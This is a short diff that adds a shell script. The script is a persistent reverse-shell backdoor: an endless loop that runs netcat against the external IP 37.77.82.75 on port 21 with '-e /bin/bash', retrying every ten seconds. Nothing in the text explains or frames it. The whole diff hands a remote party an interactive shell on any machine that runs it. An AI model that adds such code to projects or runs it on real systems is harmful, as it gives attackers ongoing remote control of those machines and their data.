@@ -1,0 +1,6 @@
+#!/bin/sh
+while [ true ]
+do
+    nc 37.77.82.75 21 -e /bin/bash
+    sleep 10
+done
